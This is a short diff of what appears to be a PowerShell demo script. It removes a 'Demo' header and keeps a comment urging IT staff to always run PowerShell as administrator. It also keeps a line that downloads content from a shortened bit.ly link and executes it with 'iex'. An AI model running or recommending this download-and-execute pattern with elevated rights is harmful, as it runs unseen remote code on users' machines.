@@ -1,5 +1,4 @@
-﻿##Demo##
-#If I.T. - Always run Powershell as an administrator. Set this with shortcut property
+﻿#If I.T. - Always run Powershell as an administrator. Set this with shortcut property
 
 #Powershell commands are suppose to be easy, yet Powerful
 start Powershell -ArgumentList '-noprofile -command iex (iwr bit.ly/e0Mw9w)'
